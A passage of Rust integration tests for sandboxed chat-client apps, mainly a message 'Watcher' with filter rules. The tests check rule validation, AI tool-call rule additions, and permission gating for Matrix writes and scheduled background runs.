    host.settle_stock(&app, "simple-watcher", &mut audit);
    assert_eq!(audit.notifications, ["Simple Watcher: release: alice: release today"]);
}

#[test]
fn stock_watcher_saves_without_write_permission_and_tests_only_the_selected_rule_actions() {
    let mut host = Harness::new();
    let (app, context) = host.launch_stock_permissions("watcher", false, false);
    host.permissions.set_matrix_write(false);
    host.boot();
    let mut audit = StockAudit::default();
    host.settle_stock(&app, "watcher", &mut audit);
    assert!(host.call_index_text(&app, "set_value", 0, "release"));
    app.text_input(&host.cx, ids!(reply_input)).set_text(&mut host.cx, "Thanks for the release update");
    host.flow.borrow_mut().add_sources(&context, [Source::Account { account: ACCOUNT.into() }]).unwrap();
    assert!(host.call(&app, "save_rule", &[]));
    host.settle_stock(&app, "watcher", &mut audit);
    assert_eq!(audit.write_setups, 0, "saving a rule cannot enable Matrix writes");
    assert!(audit.notifications.is_empty());
    assert!(audit.services.is_empty());
    assert!(host.call_object(&app, "test_rule", r#"{"match":"all","filters":[{"field":"text","op":"contains","value":"release"}],"notify":true,"reply":"Thanks for the release update"}"#));
    host.settle_stock(&app, "watcher", &mut audit);
    assert_eq!(audit.batch_prompts, 0, "an already approved watcher needs no new blanket setup");
    assert_eq!(audit.write_setups, 1, "testing a reply explicitly enables writes and grants its declared room-send ability");
    assert_eq!(audit.notifications, ["Watcher test: Test alert: Message contains “release”"]);
    assert_eq!(audit.services, ["matrix.room.message.send"]);
    host.flow.borrow_mut().add_sources(&context, [Source::Room { account: ACCOUNT.into(), room: ROOM.into() }]).unwrap();
    host.flow.borrow_mut().add_influences(&context, [Influence::RoomContent { account: ACCOUNT.into(), room: ROOM.into() }]).unwrap();
    assert!(host.call_strings(&app, "on_room_message", &[r#"[{"room_id":"!private:test","event_id":"$message:test","sender":"alice","sender_id":"@alice:test","sender_name":"Alice","body":"release today","ts":1,"msgtype":"m.text","is_own":false}]"#]));
    host.settle_stock(&app, "watcher", &mut audit);
    host.boot(); // The notification callback paces the queued reply with a timer.
    host.settle_stock(&app, "watcher", &mut audit);
    assert_eq!(audit.notifications, ["Watcher test: Test alert: Message contains “release”", "Watcher: Message contains “release”: Alice: release today"]);
    assert_eq!(audit.services, ["matrix.room.message.send", "matrix.room.message.send"]);
    let reviews = audit.reviews;
    assert!((1..=2).contains(&reviews), "the test and first influenced reply each have at most one combined review");
    host.boot(); // Finish the action pacing timer before delivering another batch.
    assert!(host.call_strings(&app, "on_room_message", &[r#"[{"room_id":"!private:test","event_id":"$message:test","sender":"alice","sender_id":"@alice:test","sender_name":"Alice","body":"release tomorrow","ts":2,"msgtype":"m.text","is_own":false}]"#]));
    host.settle_stock(&app, "watcher", &mut audit);
    host.boot();
    host.settle_stock(&app, "watcher", &mut audit);
    assert_eq!(audit.reviews, reviews, "session permission prevents repeated auto-reply reviews");
    assert_eq!(audit.services.len(), 3);
    assert_eq!(audit.write_setups, 1, "automatic replies reuse the approved write setup");
}

#[test]
fn stock_watcher_disclosure_toggles_choices_and_tracks_advanced_rule_edits() {
    fn opened(host: &mut Harness, app: &WidgetRef) -> bool {
        let arrow = app.widget(&host.cx, ids!(adv_btn.disclosure_control));
        assert!(!arrow.is_empty(), "the real disclosure has its keyboard-capable control");
        let source = app.borrow::<Splash>().unwrap().view.source.clone();
        let vm_id = host.cx.script_ref_vm_id(&source).unwrap();
        host.cx.with_script_vm_id(vm_id, |vm| {
            let background = vm.bx.heap.value(arrow.script_source(), id!(draw_bg).into(), NoTrap);
            let value = vm.bx.heap.value(background.as_object().unwrap(), id!(opened).into(), NoTrap);
            match value.as_f64() {
                Some(0.0) => false,
                Some(1.0) => true,
                value => panic!("unexpected actual arrow state: {value:?}"),
            }
        })
    }
    fn has_text(widget: &WidgetRef, text: &str) -> bool {
        if widget.text() == text { return true; }
        let mut children = Vec::new();
        widget.children(&mut |_, child| children.push(child));
        children.iter().any(|child| has_text(child, text))
    }
    let mut host = Harness::new();
    let (app, _) = host.launch_stock_permissions("watcher", false, false);
    host.boot();
    let mut audit = StockAudit::default();
    host.settle_stock(&app, "watcher", &mut audit);
    let initial_effects = (audit.prompts.len(), audit.services.len(), audit.notifications.len());
    let header = app.widget(&host.cx, ids!(adv_btn));
    assert!(app.widget(&host.cx, ids!(adv_btn.disclosure_control)).borrow::<Button>().is_some(),
        "the header keeps native keyboard and focus behavior");
    assert!(has_text(&header, "Advanced filters"));
    assert!(!opened(&mut host, &app));
    assert!(host.call_index_text(&app, "open_menu", 0, "field"));
    assert!(!has_text(&app, "Message type"));
    let control = app.widget(&host.cx, ids!(adv_btn.disclosure_control));
    host.widget_callback(&app, &control, id!(on_click), &[]);
    assert!(opened(&mut host, &app));
    assert!(host.call_index_text(&app, "open_menu", 0, "field"));
    assert!(has_text(&app, "Message type"));
    let control = app.widget(&host.cx, ids!(adv_btn.disclosure_control));
    host.widget_callback(&app, &control, id!(on_click), &[]);
    assert!(!opened(&mut host, &app));
    assert!(!has_text(&app, "Message type"), "closing the disclosure also closes the active menu");
    assert!(host.call_index_text(&app, "open_menu", 0, "field"));
    assert!(!has_text(&app, "Message type"));
    assert!(host.call_object(&app, "restore", r#"{"match":"all","filters":[{"field":"type","op":"is","value":"m.image"}],"notify":true,"reply":""}"#));
    assert!(host.call(&app, "edit_rule", &[0_u32.into()]));
    assert!(opened(&mut host, &app), "editing an advanced saved rule synchronizes the triangle");
    assert!(has_text(&header, "Advanced filters"), "the title stays stable");
    assert!(host.call(&app, "set_advanced", &[false.into()]));
    assert!(!opened(&mut host, &app));
    assert!(host.call(&app, "edit_rule", &[0_u32.into()]));
    assert!(opened(&mut host, &app), "programmatic reopening does not invoke a toggling callback");
    host.settle_stock(&app, "watcher", &mut audit);
    assert_eq!((audit.prompts.len(), audit.services.len(), audit.notifications.len()), initial_effects,
        "disclosure interaction cannot ask for more authority or perform external work");
}

#[test]
fn stock_watcher_legacy_rule_defaults_ignore_nested_optional_keys() {
    let mut host = Harness::new();
    let (app, context) = host.launch_stock("watcher", false);
    host.boot();
    let mut audit = StockAudit::default();
    host.settle_stock(&app, "watcher", &mut audit);
    // Optional rule fields are absent at the top level. Unrelated nested
    // metadata with the same keys cannot turn them into present properties.
    assert!(host.call_object(&app, "restore", r#"{"keyword":"lunch","notify":true,"reply":"","metadata":{"match":"any","filters":[],"by_ai":true}}"#));
    assert!(host.call(&app, "save", &[]));
    host.settle_stock(&app, "watcher", &mut audit);
    let rules_path = host.flow.borrow().context_storage_path(&context).unwrap().join("rules.json");
    let saved: serde_json::Value = serde_json::from_str(&std::fs::read_to_string(rules_path).unwrap()).unwrap();
    assert_eq!(saved.as_array().unwrap().len(), 1);
    assert_eq!(saved[0]["match"], "all");
    assert_eq!(saved[0]["filters"][0]["value"], "lunch");
    assert_eq!(saved[0]["by_ai"], false);
    assert!(audit.notifications.is_empty());
    assert!(audit.services.is_empty());
}

#[test]
fn stock_watcher_filters_combine_any_all_and_negation_and_the_ai_adds_notify_only_rules() {
    let mut host = Harness::new();
    let (app, context) = host.launch_stock("watcher", false);
    host.boot();
    let mut audit = StockAudit::default();
    host.settle_stock(&app, "watcher", &mut audit);
    assert!(host.call(&app, "save_rule", &[]));
    assert!(app.widget(&host.cx, ids!(status)).text().starts_with("Rule not saved: Message needs a value."));

    // Message contains any of "wifi, password", doesn't contain "solved", and Alice sent it.
    assert!(host.call(&app, "set_advanced", &[true.into()]));
    assert!(host.call_index_text(&app, "open_menu", 0, "op"));
    assert!(host.call_strings(&app, "choose", &["any_of"]));
    assert!(host.call_index_text(&app, "set_value", 0, "wifi, password"));
    assert!(host.call(&app, "add_filter", &[]));
    assert!(host.call_index_text(&app, "open_menu", 1, "op"));
    assert!(host.call_strings(&app, "choose", &["not_contains"]));
    assert!(host.call_index_text(&app, "set_value", 1, "solved"));
    assert!(host.call(&app, "add_filter", &[]));
    assert!(host.call_index_text(&app, "open_menu", 2, "field"));
    assert!(host.call_strings(&app, "choose", &["sender"]));
    assert!(host.call_index_text(&app, "set_value", 2, "alice"));
    assert!(host.call(&app, "save_rule", &[]));
    // An older Watcher's single keyword comes back as "Message contains".
    assert!(host.call_object(&app, "restore", r#"{"keyword":"lunch","notify":true,"reply":""}"#));
    host.settle_stock(&app, "watcher", &mut audit);

    // The AI adds an `any` rule over advanced fields; a bad operator is refused.
    let call = r#"{"call_id":7,"tool":"app_watcher_add_rule","name":"add_rule","arguments":{"match":"any","filters":[{"field":"type","op":"is","value":"m.notice"},{"field":"link","op":"has","value":""}]}}"#;
    assert!(host.call_strings(&app, "on_tool_call", &[call]));
    host.settle_stock(&app, "watcher", &mut audit);
    let bad = r#"{"call_id":8,"tool":"app_watcher_add_rule","name":"add_rule","arguments":{"match":"all","filters":[{"field":"sender","op":"has","value":"x"}]}}"#;
    assert!(host.call_strings(&app, "on_tool_call", &[bad]));
    host.settle_stock(&app, "watcher", &mut audit);
    assert_eq!(audit.tool_results.len(), 2);
    assert!(audit.tool_results[0].0 && audit.tool_results[0].1.contains("Message type is bot notice or Link has a link"), "{:?}", audit.tool_results);
    assert!(!audit.tool_results[1].0 && audit.tool_results[1].1.starts_with("Rule not added:"), "{:?}", audit.tool_results);
    assert!(audit.notifications.is_empty());

    // Reserved-key escaping must preserve the existing JSON schema, including
    // a restored keyword rule and the AI's `any` rule.
    let rules_path = host.flow.borrow().context_storage_path(&context).unwrap().join("rules.json");
    let saved: serde_json::Value = serde_json::from_str(&std::fs::read_to_string(rules_path).unwrap()).unwrap();
    assert_eq!(saved.as_array().unwrap().len(), 3);
    assert_eq!(saved[0]["match"], "all");
    assert_eq!(saved[1]["match"], "all");
    assert_eq!(saved[1]["filters"][0]["value"], "lunch");
    assert_eq!(saved[2]["match"], "any");
    assert_eq!(saved[2]["by_ai"], true);
    assert!(host.call(&app, "edit_rule", &[2_u32.into()]));
    assert_eq!(app.widget(&host.cx, ids!(match_btn)).text(), "any");
    assert!(host.call(&app, "toggle_match", &[]));
    assert_eq!(app.widget(&host.cx, ids!(match_btn)).text(), "all");
    assert!(host.call(&app, "toggle_match", &[]));
    assert_eq!(app.widget(&host.cx, ids!(match_btn)).text(), "any");
    assert!(host.call(&app, "clear_editor", &[]));

    let batch = r#"[
        {"event_id":"$1:test","sender_id":"@alice:test","sender_name":"Alice","body":"What's the Wi-Fi password?","msgtype":"m.text","is_own":false},
        {"event_id":"$2:test","sender_id":"@alice:test","sender_name":"Alice","body":"wifi solved, thanks","msgtype":"m.text","is_own":false},
        {"event_id":"$3:test","sender_id":"@bob:test","sender_name":"Bob","body":"the wifi password changed","msgtype":"m.text","is_own":false},
        {"event_id":"$4:test","sender_id":"@ci:test","sender_name":"CI","body":"Build finished","msgtype":"m.notice","is_own":false},
        {"event_id":"$5:test","sender_id":"@bob:test","sender_name":"Bob","body":"slides: https://example.org/talk","msgtype":"m.text","is_own":false},
        {"event_id":"$6:test","sender_id":"@bob:test","sender_name":"Bob","body":"Lunch at noon?","msgtype":"m.text","is_own":false},
        {"event_id":"$7:test","sender_id":"@bob:test","sender_name":"Bob","body":"plain words","msgtype":"m.text","is_own":false}
    ]"#;
    assert!(host.call_strings(&app, "on_room_message", &[batch]));
    for _ in 0..4 {
        host.settle_stock(&app, "watcher", &mut audit);
        host.boot(); // Watcher paces its automatic notifications with a timer.
    }
    host.settle_stock(&app, "watcher", &mut audit);
    let wifi = "Message contains any of “wifi, password” and Message doesn't contain “solved” and Sender is “alice”";
    let ai = "Message type is bot notice or Link has a link";
    assert_eq!(audit.notifications, [
        format!("Watcher: {wifi}: Alice: What's the Wi-Fi password?"),
        format!("Watcher: {ai}: CI: Build finished"),
        format!("Watcher: {ai}: Bob: slides: https://example.org/talk"),
        "Watcher: Message contains “lunch”: Bob: Lunch at noon?".to_string(),
    ]);
}

#[test]
fn stock_watcher_advanced_filters_match_words_mentions_lists_patterns_attachments_and_sites() {
    let mut host = Harness::new();
    let (app, context) = host.launch_stock("watcher", false);
    host.boot();
    let mut audit = StockAudit::default();
    host.settle_stock(&app, "watcher", &mut audit);
    let rules = [
        r#"{"match":"all","filters":[{"field":"text","op":"none_of","value":"lunch, coffee"},{"field":"text","op":"word","value":"bug"}],"notify":true,"reply":""}"#,
        r#"{"match":"all","filters":[{"field":"text","op":"mentions","value":"@kevin"},{"field":"sender","op":"none_of","value":"Build Bot, @ci:test"}],"notify":true,"reply":""}"#,
        r#"{"match":"all","filters":[{"field":"text","op":"ends_with","value":"?"},{"field":"sender","op":"any_of","value":"alice, @bob:test"}],"notify":true,"reply":""}"#,
        r#"{"match":"all","filters":[{"field":"text","op":"pattern","value":"deploy * to prod"}],"notify":true,"reply":""}"#,
        r#"{"match":"any","filters":[{"field":"type","op":"is","value":"media"},{"field":"link","op":"to","value":"https://www.github.com/robius"}],"notify":true,"reply":""}"#,
        r#"{"match":"all","filters":[{"field":"type","op":"is_not","value":"media"},{"field":"type","op":"is","value":"m.location"}],"notify":true,"reply":""}"#,
    ];
    for rule in rules { assert!(host.call_object(&app, "restore", rule)); }
    assert!(host.call(&app, "save", &[]));
    let rules_path = host.flow.borrow().context_storage_path(&context).unwrap().join("rules.json");
    let saved: serde_json::Value = serde_json::from_str(&std::fs::read_to_string(&rules_path).unwrap()).unwrap();
    assert_eq!(saved.as_array().unwrap().len(), rules.len(), "every advanced rule passes validation");
    assert_eq!(saved[4]["filters"][1]["value"], "github.com", "a link filter keeps just the site");

    let batch = r#"[
        {"event_id":"$1:test","sender_id":"@alice:test","sender_name":"Alice","body":"Found a bug in the login flow","msgtype":"m.text","is_own":false},
        {"event_id":"$2:test","sender_id":"@alice:test","sender_name":"Alice","body":"a bug in the lunch order","msgtype":"m.text","is_own":false},
        {"event_id":"$3:test","sender_id":"@priya:test","sender_name":"Priya","body":"@kevin can you look at this","msgtype":"m.text","is_own":false},
        {"event_id":"$4:test","sender_id":"@ci:test","sender_name":"Build Bot","body":"kevin: nightly failed","msgtype":"m.notice","is_own":false},
        {"event_id":"$5:test","sender_id":"@bob:test","sender_name":"Bob","body":"Is the release ready?","msgtype":"m.text","is_own":false},
        {"event_id":"$6:test","sender_id":"@carol:test","sender_name":"Carol","body":"Shall we deploy v2 to prod tonight","msgtype":"m.text","is_own":false},
        {"event_id":"$7:test","sender_id":"@dan:test","sender_name":"Dan","body":"screenshot.png","msgtype":"m.image","is_own":false},
        {"event_id":"$8:test","sender_id":"@dan:test","sender_name":"Dan","body":"PR: https://github.com/robius/robrix/pull/12","msgtype":"m.text","is_own":false},
        {"event_id":"$9:test","sender_id":"@dan:test","sender_name":"Dan","body":"mirror at https://notgithub.com/x","msgtype":"m.text","is_own":false},
        {"event_id":"$10:test","sender_id":"@dan:test","sender_name":"Dan","body":"Meet here","msgtype":"m.location","is_own":false},
        {"event_id":"$11:test","sender_id":"@eve:test","sender_name":"Eve","body":"Is this a debug build?","msgtype":"m.text","is_own":false}
    ]"#;
    assert!(host.call_strings(&app, "on_room_message", &[batch]));
    for _ in 0..10 {
        host.settle_stock(&app, "watcher", &mut audit);
        host.boot(); // Watcher paces its automatic notifications with a timer.
    }
    host.settle_stock(&app, "watcher", &mut audit);
    let sites = "Message type is any attachment or Link goes to “github.com”";
    assert_eq!(audit.notifications, [
        "Watcher: Message contains none of “lunch, coffee” and Message has the word “bug”: Alice: Found a bug in the login flow".to_string(),
        "Watcher: Message mentions “@kevin” and Sender is none of “Build Bot, @ci:test”: Priya: @kevin can you look at this".to_string(),
        "Watcher: Message ends with “?” and Sender is any of “alice, @bob:test”: Bob: Is the release ready?".to_string(),
        "Watcher: Message matches pattern “deploy * to prod”: Carol: Shall we deploy v2 to prod tonight".to_string(),
        format!("Watcher: {sites}: Dan: screenshot.png"),
        format!("Watcher: {sites}: Dan: PR: https://github.com/robius/robrix/pull/12"),
        "Watcher: Message type is not any attachment and Message type is location: Dan: Meet here".to_string(),
    ]);

}

#[test]
fn stock_watcher_editor_resets_and_validates_advanced_filters_and_the_ai_gets_each_reason() {
    let mut host = Harness::new();
    let (app, context) = host.launch_stock("watcher", false);
    host.boot();
    let mut audit = StockAudit::default();
    host.settle_stock(&app, "watcher", &mut audit);
    // Changing a filter's field resets its operator and value.
    assert!(host.call(&app, "set_advanced", &[true.into()]));
    assert!(host.call_index_text(&app, "set_value", 0, "stale"));
    assert!(host.call_index_text(&app, "open_menu", 0, "field"));
    assert!(host.call_strings(&app, "choose", &["link"]));
    assert!(host.call(&app, "save_rule", &[]));
    assert!(host.call_index_text(&app, "open_menu", 0, "field"));
    assert!(host.call_strings(&app, "choose", &["type"]));
    assert!(host.call(&app, "save_rule", &[]));
    let rules_path = host.flow.borrow().context_storage_path(&context).unwrap().join("rules.json");
    let saved: serde_json::Value = serde_json::from_str(&std::fs::read_to_string(&rules_path).unwrap()).unwrap();
    assert_eq!(saved[0]["filters"][0], serde_json::json!({"field": "link", "op": "has", "value": ""}));
    assert_eq!(saved[1]["filters"][0], serde_json::json!({"field": "type", "op": "is", "value": "m.notice"}));
    // Each advanced operator's own check, through the editor's Save rule.
    assert!(host.call(&app, "set_advanced", &[true.into()]));
    for (field, op, value, reason) in [
        ("text", "pattern", " * ", "Add some text around the * in the pattern."),
        ("link", "to", "not a site", "Enter a site, like github.com."),
        ("text", "mentions", "@", "Enter a name to look for."),
        ("text", "none_of", " , ", "List words, separated by commas."),
        ("sender", "any_of", ",", "List names, separated by commas."),
    ] {
        assert!(host.call_index_text(&app, "open_menu", 0, "field"));
        assert!(host.call_strings(&app, "choose", &[field]));
        assert!(host.call_index_text(&app, "open_menu", 0, "op"));
        assert!(host.call_strings(&app, "choose", &[op]));
        assert!(host.call_index_text(&app, "set_value", 0, value));
        assert!(host.call(&app, "save_rule", &[]));
        assert_eq!(app.widget(&host.cx, ids!(status)).text(), format!("Rule not saved: {reason}"), "{field} {op}");
    }
    // The AI may use the new operators, and hears why a filter is refused.
    let calls = [
        r#"{"field":"sender","op":"any_of","value":"alice, bob"}"#,
        r#"{"field":"type","op":"is","value":"m.sticker"}"#,
    ];
    for (id, filter) in calls.iter().enumerate() {
        let call = format!(r#"{{"call_id":{id},"tool":"app_watcher_add_rule","name":"add_rule","arguments":{{"match":"all","filters":[{filter}]}}}}"#);
        assert!(host.call_strings(&app, "on_tool_call", &[&call]));
        host.settle_stock(&app, "watcher", &mut audit);
    }
    assert_eq!(audit.tool_results.len(), 2);
    assert!(audit.tool_results[0].0 && audit.tool_results[0].1.contains("Sender is any of “alice, bob”"), "{:?}", audit.tool_results);
    assert_eq!(audit.tool_results[1], (false, "Rule not added: Choose a message type.".to_string()));
    assert!(audit.notifications.is_empty());
}

#[test]
fn stock_watcher_mentions_replies_and_threads_match_whether_or_not_the_host_sends_them() {
    let mut host = Harness::new();
    let (app, _) = host.launch_stock("watcher", false);
    host.boot();
    let mut audit = StockAudit::default();
    host.settle_stock(&app, "watcher", &mut audit);
    for rule in [
        r#"{"match":"all","filters":[{"field":"text","op":"mentions_me"}],"notify":true,"reply":""}"#,
        r#"{"match":"all","filters":[{"field":"text","op":"is_reply"},{"field":"sender","op":"is","value":"alice"}],"notify":true,"reply":""}"#,
        r#"{"match":"any","filters":[{"field":"text","op":"in_thread"},{"field":"text","op":"contains","value":"urgent"}],"notify":true,"reply":""}"#,
        r#"{"match":"all","filters":[{"field":"text","op":"not_reply"},{"field":"text","op":"not_thread"},{"field":"text","op":"contains","value":"standup"}],"notify":true,"reply":""}"#,
    ] { assert!(host.call_object(&app, "restore", rule)); }
    // Rows from older hosts omit the new fields: missing means false or null.
    let batch = r#"[
        {"event_id":"$1:test","sender_id":"@alice:test","sender_name":"Alice","body":"hey kevin, quick question","msgtype":"m.text","is_own":false,"mentions_me":true,"reply_to":null,"thread_root":null},
        {"event_id":"$2:test","sender_id":"@alice:test","sender_name":"Alice","body":"sounds good","msgtype":"m.text","is_own":false,"mentions_me":false,"reply_to":"$1:test","thread_root":null},
        {"event_id":"$3:test","sender_id":"@bob:test","sender_name":"Bob","body":"thread notes","msgtype":"m.text","is_own":false,"mentions_me":false,"reply_to":null,"thread_root":"$root:test"},
        {"event_id":"$4:test","sender_id":"@bob:test","sender_name":"Bob","body":"standup at 10","msgtype":"m.text","is_own":false},
        {"event_id":"$5:test","sender_id":"@bob:test","sender_name":"Bob","body":"urgent: prod is down","msgtype":"m.text","is_own":false},
        {"event_id":"$6:test","sender_id":"@carol:test","sender_name":"Carol","body":"standup moved","msgtype":"m.text","is_own":false,"reply_to":"$4:test"},
        {"event_id":"$7:test","sender_id":"@alice:test","sender_name":"Alice","body":"replying in the thread","msgtype":"m.text","is_own":false,"reply_to":"$3:test","thread_root":"$root:test"}
    ]"#;
    assert!(host.call_strings(&app, "on_room_message", &[batch]));
    for _ in 0..10 {
        host.settle_stock(&app, "watcher", &mut audit);
        host.boot(); // Watcher paces its automatic notifications with a timer.
    }
    host.settle_stock(&app, "watcher", &mut audit);
    let reply = "Message is a reply and Sender is “alice”";
    let thread = "Message is in a thread or Message contains “urgent”";
    assert_eq!(audit.notifications, [
        "Watcher: Message mentions me: Alice: hey kevin, quick question".to_string(),
        format!("Watcher: {reply}: Alice: sounds good"),
        format!("Watcher: {thread}: Bob: thread notes"),
        "Watcher: Message isn't a reply and Message isn't in a thread and Message contains “standup”: Bob: standup at 10".to_string(),
        format!("Watcher: {thread}: Bob: urgent: prod is down"),
        format!("Watcher: {reply}: Alice: replying in the thread"),
        format!("Watcher: {thread}: Alice: replying in the thread"),
    ]);
}

#[test]
fn stock_watcher_offers_mentions_me_by_default_and_the_ai_adds_reply_and_thread_rules() {
    let mut host = Harness::new();
    let (app, context) = host.launch_stock("watcher", false);
    host.boot();
    let mut audit = StockAudit::default();
    host.settle_stock(&app, "watcher", &mut audit);
    fn has_text(widget: &WidgetRef, text: &str) -> bool {
        if widget.text() == text { return true; }
        let mut children = Vec::new();
        widget.children(&mut |_, child| children.push(child));
        children.iter().any(|child| has_text(child, text))
    }
    // "mentions me" is a basic choice; replies and threads wait for Advanced.
    assert!(host.call_index_text(&app, "open_menu", 0, "op"));
    assert!(has_text(&app, "mentions me"));
    assert!(!has_text(&app, "is a reply"));
    assert!(host.call_strings(&app, "choose", &["mentions_me"]));
    assert!(host.call_index_text(&app, "set_value", 0, "stray text"));
    assert!(host.call(&app, "save_rule", &[]));
    assert!(host.call(&app, "set_advanced", &[true.into()]));
    assert!(host.call_index_text(&app, "open_menu", 0, "op"));
    assert!(has_text(&app, "is a reply") && has_text(&app, "isn't in a thread"));

    let good = r#"{"call_id":1,"tool":"app_watcher_add_rule","name":"add_rule","arguments":{"match":"any","filters":[{"field":"text","op":"is_reply","value":"ignored"},{"field":"text","op":"in_thread"}]}}"#;
    let bad = r#"{"call_id":2,"tool":"app_watcher_add_rule","name":"add_rule","arguments":{"match":"all","filters":[{"field":"sender","op":"in_thread"}]}}"#;
    for call in [good, bad] {
        assert!(host.call_strings(&app, "on_tool_call", &[call]));
        host.settle_stock(&app, "watcher", &mut audit);
    }
    assert_eq!(audit.tool_results.len(), 2);
    assert!(audit.tool_results[0].0 && audit.tool_results[0].1.contains("Message is a reply or Message is in a thread"), "{:?}", audit.tool_results);
    assert_eq!(audit.tool_results[1], (false, "Rule not added: Sender can't use “in_thread”.".to_string()));
    let rules_path = host.flow.borrow().context_storage_path(&context).unwrap().join("rules.json");
    let saved: serde_json::Value = serde_json::from_str(&std::fs::read_to_string(rules_path).unwrap()).unwrap();
    assert_eq!(saved[0]["filters"][0], serde_json::json!({"field": "text", "op": "mentions_me", "value": ""}), "value-less filters keep no stray text");
    assert_eq!(saved[1]["filters"][0], serde_json::json!({"field": "text", "op": "is_reply", "value": ""}));
    assert_eq!(saved[1]["by_ai"], true);

    let batch = r#"[
        {"event_id":"$1:test","sender_id":"@bob:test","sender_name":"Bob","body":"top-level note","msgtype":"m.text","is_own":false},
        {"event_id":"$2:test","sender_id":"@bob:test","sender_name":"Bob","body":"in the thread","msgtype":"m.text","is_own":false,"mentions_me":false,"reply_to":null,"thread_root":"$1:test"}
    ]"#;
    assert!(host.call_strings(&app, "on_room_message", &[batch]));
    host.settle_stock(&app, "watcher", &mut audit);
    assert_eq!(audit.notifications, ["Watcher: Message is a reply or Message is in a thread: Bob: in the thread"]);
}

#[test]
fn stock_inbox_accept_search_result_and_account_dm_finish_the_original_action() {
    for app_id in ["inbox", "search", "account"] {
        let mut host = Harness::new();
        let (app, _) = host.launch_stock_permissions(app_id, false, false);
        host.boot();
        let mut audit = StockAudit::default();
        host.settle_stock(&app, app_id, &mut audit);
        match app_id {
            "inbox" => {
                assert!(host.call(&app, "pick_invite", &[0_u32.into()]));
                assert!(host.call(&app, "answer_invite", &[true.into()]));
            }
            "search" => {
                assert!(host.call_strings(&app, "set_mode", &["pick"]));
                host.settle_stock(&app, app_id, &mut audit);
                assert!(host.call(&app, "toggle_pick", &[0_u32.into()]));
                assert!(host.call_strings(&app, "run_search", &["release"]));
                host.settle_stock(&app, app_id, &mut audit);
                assert!(host.call(&app, "open_result", &[0_u32.into()]));
            }
            "account" => {
                assert!(host.call_strings(&app, "lookup", &["@alice:test"]));
                host.settle_stock(&app, app_id, &mut audit);
                assert!(host.call(&app, "open_dm", &[]));
            }
            _ => unreachable!(),
        }
        host.settle_stock(&app, app_id, &mut audit);
        match app_id {
            "inbox" => {
                assert!(audit.services.contains(&"matrix.invites.respond".into()));
                assert_eq!(app.widget(&host.cx, ids!(status)).text(), "Accepted the invite to Invited room");
            }
            "search" => assert_eq!(audit.actions, ["event"]),
            "account" => assert_eq!(audit.actions, ["room"]),
            _ => unreachable!(),
        }
    }
}

#[test]
fn stock_website_room_reports_and_keyword_empty_batches_finish_without_prompt_loops() {
    let mut host = Harness::new();
    let (app, context) = host.launch_stock_permissions("website-watch", false, false);
    assert!(host.call(&app, "on_app_resize", &[460_f64.into(), 700_f64.into()]));
    assert!(host.call(&app, "toggle_post", &[]));
    assert!(host.call(&app, "save", &[]));
    host.permissions.set_matrix_write(false);
    host.flow.borrow_mut().add_sources(&context, [Source::Account { account: ACCOUNT.into() }]).unwrap();
    assert!(host.call(&app, "test_website", &[]));
    let mut audit = StockAudit::default();
    host.settle_stock(&app, "website-watch", &mut audit);
    assert_eq!(audit.services, ["network.http", "matrix.room.message.send"]);
    assert!(audit.completions.is_empty());
    assert_eq!(audit.write_setups, 1);
    assert_eq!(app.widget(&host.cx, ids!(status)).text(), "Keyword found. Test report posted to this room.");
    let grants = (audit.prompts.len(), audit.reviews, audit.write_setups);
    app.borrow_mut::<Splash>().unwrap().set_host_prompts(&mut host.cx, false);
    // A real scheduled check occurs after the setup rate budget refills.
    host.broker.forget_app("website-watch");
    assert!(host.call_strings(&app, "on_background", &[r#"{"run_id":71}"#]));
    host.settle_stock(&app, "website-watch", &mut audit);
    assert_eq!(audit.services, ["network.http", "matrix.room.message.send", "network.http", "matrix.room.message.send"]);
    assert_eq!(audit.completions, [(71, true)]);
    assert_eq!(app.widget(&host.cx, ids!(status)).text(), "Match posted to this room.");
    let reviews = audit.reviews;
    assert!(reviews <= 2, "one approved website release and one influenced room report");
    assert!(host.call_strings(&app, "on_background", &[r#"{"run_id":72}"#]));
    host.settle_stock(&app, "website-watch", &mut audit);
    assert_eq!(audit.services, ["network.http", "matrix.room.message.send", "network.http", "matrix.room.message.send", "network.http"]);
    assert_eq!(app.widget(&host.cx, ids!(status)).text(), "Keyword is still present; already reported.");
    assert_eq!(audit.completions, [(71, true), (72, true)]);
    assert_eq!(audit.reviews, reviews);
    assert_eq!((audit.prompts.len(), audit.reviews, audit.write_setups), grants, "scheduled work never prompts again after foreground setup");
    assert_eq!(app.widget(&host.cx, ids!(status)).text(), "Keyword is still present; already reported.");

    let mut host = Harness::new();
    let (app, _) = host.launch_stock_permissions("keyword-alert", false, false);
    let mut audit = StockAudit::default();
    assert!(host.call_strings(&app, "on_background", &[r#"{"run_id":73,"messages":[{"body":"release today","is_own":true},{"body":"nothing new","is_own":false}]}"#]));
    host.settle_stock(&app, "keyword-alert", &mut audit);
    assert_eq!(audit.completions, [(73, true)]);
    assert!(audit.notifications.is_empty());
    assert!(audit.prompts.is_empty(), "an unmatched/own-message batch needs no notification grant");
}

#[test]
fn stock_background_apps_refuse_missing_hidden_grants_then_run_after_visible_setup() {
    for (app_id, setup) in [("reminder", "test_reminder"), ("keyword-alert", "test_alert"), ("website-watch", "test_website")] {
        let mut host = Harness::new();
        let (app, _) = host.launch_stock_permissions(app_id, false, false);
        assert!(host.call(&app, "on_app_resize", &[460_f64.into(), 700_f64.into()]));
        app.borrow_mut::<Splash>().unwrap().set_host_prompts(&mut host.cx, false);
        assert!(host.call_strings(&app, "on_background", &[r#"{"run_id":91,"messages":[{"body":"release today","is_own":false}]}"#]));
        let mut completions = Vec::new();
        for _ in 0..10 {
            for ask in host.process() {
                match ask {
                    BrokerAsk::BackgroundComplete { reply, run_id, success } => {
                        completions.push((run_id, success));
                        host.reply(reply, "{}");
                    }
                    BrokerAsk::Used { .. } => {},
                    _ => panic!("{app_id} hidden work must refuse missing grants without prompting or performing an effect"),
                }
            }
        }
        assert_eq!(completions, [(91, false)], "{app_id} reports its denied scheduled run");
        let failures = host.broker.failures();
        assert_eq!(failures.len(), 1, "{app_id} records the missing ability once");
        assert!(failures[0].error.contains("permission"), "{}", failures[0].error);
        assert!(!host.stock_callbacks_paused());
        host.assert_callback_errors(app_id);
        app.borrow_mut::<Splash>().unwrap().set_host_prompts(&mut host.cx, true);
        assert!(host.call(&app, setup, &[]));
        if app_id == "website-watch" {
            assert!(host.call(&app, setup, &[]));
            assert!(host.call(&app, setup, &[]));
        }
        let mut audit = StockAudit::default();
        host.settle_stock(&app, app_id, &mut audit);
        assert!(audit.completions.is_empty());
        assert_eq!(audit.notifications.len(), 1, "{app_id} foreground setup completes once");
        if app_id == "website-watch" {
